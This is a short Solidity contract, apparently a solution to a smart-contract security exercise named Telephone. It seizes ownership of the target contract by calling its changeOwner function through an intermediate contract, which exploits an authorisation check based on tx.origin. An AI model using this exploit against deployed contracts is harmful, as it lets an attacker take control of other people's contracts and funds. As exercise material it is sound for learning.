pragma solidity ^0.6.0;

import "../../../Exercise/Stage1/4/Telephone.sol";

contract AttackTelephone {
    Telephone private telephone;
    constructor(Telephone telephoneAddress) public {
        telephone = telephoneAddress;
    }

    function attack(address newOwner) external {
       telephone.changeOwner(newOwner);
    }
}
